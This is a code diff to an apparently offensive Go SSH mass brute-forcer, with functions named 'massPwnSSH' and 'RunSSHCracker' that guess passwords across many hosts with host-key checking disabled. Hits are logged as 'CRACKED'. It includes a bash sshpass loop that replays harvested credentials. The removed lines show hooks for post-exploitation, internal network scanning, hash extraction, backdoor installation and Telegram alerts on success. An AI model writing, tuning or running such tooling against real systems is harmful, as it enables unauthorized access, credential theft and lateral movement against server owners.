@@ -137,16 +137,18 @@ func (wp *SSHWorkerPool) processJob(job SSHJob) SSHResult {
 	atomic.AddInt64(&sshTotalAttempts, 1)
 
 	timeout := job.Timeout
-	if timeout > 5 {
-		timeout = 5
+	if timeout < 10 {
+		timeout = 10
 	}
-	if timeout < 2 {
-		timeout = 2
+	if timeout > 30 {
+		timeout = 30
 	}
 
 	cfg := &ssh.ClientConfig{
-		User:            job.User,
-		Auth:            []ssh.AuthMethod{ssh.Password(job.Password)},
+		User: job.User,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(job.Password),
+		},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 		Timeout:         time.Duration(timeout) * time.Second,
 	}
@@ -161,14 +163,6 @@ func (wp *SSHWorkerPool) processJob(job SSHJob) SSHResult {
 	sshConn, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(job.Host, job.Port), cfg)
 	if err != nil {
 		atomic.AddInt64(&sshFailedCount, 1)
-		errStr := err.Error()
-		if strings.Contains(errStr, "unable to authenticate") ||
-			strings.Contains(errStr, "authentication failed") ||
-			strings.Contains(errStr, "access denied") ||
-			strings.Contains(errStr, "permission denied") ||
-			strings.Contains(errStr, "no supported methods") {
-			return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
-		}
 		return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
 	}
 	defer sshConn.Close()
@@ -183,26 +177,41 @@ func (wp *SSHWorkerPool) processJob(job SSHJob) SSHResult {
 	}
 	defer session.Close()
 
-	execCtx, execCancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
-	defer execCancel()
+	var stdoutBuf bytes.Buffer
+	session.Stdout = &stdoutBuf
 
-	done := make(chan error, 1)
-	go func() {
-		done <- session.Run("echo OK")
-	}()
-
-	select {
-	case err := <-done:
-		if err != nil {
-			atomic.AddInt64(&sshFailedCount, 1)
-			return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
-		}
-		atomic.AddInt64(&sshSuccessCount, 1)
-		return SSHResult{Success: true, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password}
-	case <-execCtx.Done():
+	err = session.Run("uname -a")
+	if err != nil {
 		atomic.AddInt64(&sshFailedCount, 1)
-		return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: fmt.Errorf("command timeout")}
+		return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
 	}
+
+	output := stdoutBuf.String()
+	if strings.Contains(output, "Linux") || strings.Contains(output, "Unix") || strings.Contains(output, "Darwin") {
+		atomic.AddInt64(&sshSuccessCount, 1)
+		
+		entry := fmt.Sprintf("%s:%s|%s:%s|SSH", job.Host, job.Port, job.User, job.Password)
+		
+		sshCrackedMu.Lock()
+		sshCrackedList = append(sshCrackedList, entry)
+		sshCrackedMu.Unlock()
+		
+		if crackedBuffer != nil {
+			crackedBuffer.Append(entry)
+		}
+		
+		if sshResultCallback != nil {
+			sshResultCallback(job.Host, job.Port, job.User, job.Password)
+		}
+		
+		fmt.Printf("\n%s SSH CRACKED!%s %s@%s:%s | %s\n",
+			colors.Green, colors.Reset, job.User, job.Host, job.Port, job.Password)
+		
+		return SSHResult{Success: true, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password}
+	}
+
+	atomic.AddInt64(&sshFailedCount, 1)
+	return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: fmt.Errorf("invalid response")}
 }
 
 func (wp *SSHWorkerPool) AddJob(job SSHJob) {
@@ -249,13 +258,18 @@ func massPwnSSH(hosts []string, port string, users, passes []string, timeout int
 					defer func() { <-sem }()
 
 					timeoutVal := timeout
-					if timeoutVal > 5 {
-						timeoutVal = 5
+					if timeoutVal < 10 {
+						timeoutVal = 10
+					}
+					if timeoutVal > 30 {
+						timeoutVal = 30
 					}
 
 					cfg := &ssh.ClientConfig{
-						User:            u,
-						Auth:            []ssh.AuthMethod{ssh.Password(p)},
+						User: u,
+						Auth: []ssh.AuthMethod{
+							ssh.Password(p),
+						},
 						HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 						Timeout:         time.Duration(timeoutVal) * time.Second,
 					}
@@ -281,8 +295,16 @@ func massPwnSSH(hosts []string, port string, users, passes []string, timeout int
 					}
 					defer session.Close()
 
-					err = session.Run("echo OK")
+					var stdoutBuf bytes.Buffer
+					session.Stdout = &stdoutBuf
+
+					err = session.Run("uname -a")
 					if err != nil {
+						return
+					}
+
+					output := stdoutBuf.String()
+					if !strings.Contains(output, "Linux") && !strings.Contains(output, "Unix") && !strings.Contains(output, "Darwin") {
 						return
 					}
 
@@ -340,7 +362,7 @@ while IFS= read -r line; do
         PASS="${BASH_REMATCH[4]}"
         echo "[*] Testing $USER@$HOST:$PORT"
         if command -v sshpass &> /dev/null; then
-            timeout 5 sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p "$PORT" "$USER@$HOST" "echo 'Connected successfully'" 2>/dev/null
+            timeout 5 sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p "$PORT" "$USER@$HOST" "uname -a" 2>/dev/null
             if [ $? -eq 0 ]; then
                 echo "[+] SUCCESS: $USER@$HOST:$PORT | $PASS"
                 echo "$USER@$HOST:$PORT|$PASS" >> "$SUCCESS_FILE"
@@ -360,6 +382,16 @@ echo "Results saved to $SUCCESS_FILE"
 }
 
 func RunSSHCracker(config SSHCrackerConfig) SSHCrackerResult {
+	if config.Workers > 500 {
+		config.Workers = 200
+		fmt.Printf("%s[WARN] Workers reduced to 200%s\n", colors.Yellow, colors.Reset)
+	}
+
+	if config.Timeout < 10 {
+		config.Timeout = 10
+		fmt.Printf("%s[WARN] Timeout increased to 10s%s\n", colors.Yellow, colors.Reset)
+	}
+
 	totalHosts := len(config.Hosts)
 	totalUsers := len(config.Users)
 	totalPasses := len(config.Passwords)
@@ -408,62 +440,6 @@ func RunSSHCracker(config SSHCrackerConfig) SSHCrackerResult {
 	sshFailedCount = 0
 	sshCompletedHosts = 0
 	atomic.StoreInt32(&sshStopFlag, 0)
-
-	go func() {
-		for result := range wp.Results() {
-			if result.Success {
-				atomic.AddInt64(&sshSuccessCount, 1)
-				entry := fmt.Sprintf("%s:%s|%s:%s|SSH", result.Host, result.Port, result.User, result.Password)
-
-				sshCrackedMu.Lock()
-				sshCrackedList = append(sshCrackedList, entry)
-				sshCrackedMu.Unlock()
-
-				if crackedBuffer != nil {
-					crackedBuffer.Append(entry)
-				}
-
-				if sshResultCallback != nil {
-					sshResultCallback(result.Host, result.Port, result.User, result.Password)
-				}
-
-				fmt.Printf("\n%s SSH CRACKED!%s %s@%s:%s | %s\n",
-					colors.Green, colors.Reset, result.User, result.Host, result.Port, result.Password)
-
-				if config.Checkpoint != nil {
-					config.Checkpoint.AddCracked(result.Host, result.Port, result.User, result.Password)
-					SaveCheckpoint(config.Checkpoint)
-				}
-
-				if config.Notify == 1 && config.TelegramToken != "" && config.TelegramChatID != "" {
-					go internal.SendTelegramNotification("cracked", map[string]interface{}{
-						"host": result.Host, "port": result.Port,
-						"user": result.User, "pass": result.Password, "banner": "SSH",
-					})
-				}
-
-				if config.PostExploit {
-					go ex.P0stExploit(result.Host, result.Port, result.User, result.Password)
-				}
-
-				if config.ScanNetwork {
-					go ScanInternalNetwork(result.Host, result.Port, result.User, result.Password)
-				}
-
-				if config.ExtractHash {
-					go ex.ExtractHashes(result.Host, result.Port, result.User, result.Password)
-				}
-
-				if config.DoBackdoor && config.Backdoor.Enabled {
-					go ex.InstallBackdoor(result.Host, result.Port, result.User, result.Password, config.Backdoor)
-				}
-			} else {
-				atomic.AddInt64(&sshFailedCount, 1)
-			}
-			atomic.AddInt64(&sshTotalAttempts, 1)
-			atomic.AddInt32(&sshCompletedHosts, 1)
-		}
-	}()
 
 	passwordList := make([]string, len(config.Passwords))
 	copy(passwordList, config.Passwords)
@@ -549,8 +525,10 @@ func ScanInternalNetwork(host, port, user, pass string) []string {
 	fmt.Printf("%s[NETWORK MAP] Scanning internal network from %s%s\n", colors.Magenta, host, colors.Reset)
 	var internalHosts []string
 	cfg := &ssh.ClientConfig{
-		User:            user,
-		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
+		User: user,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(pass),
+		},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 		Timeout:         10 * time.Second,
 	}
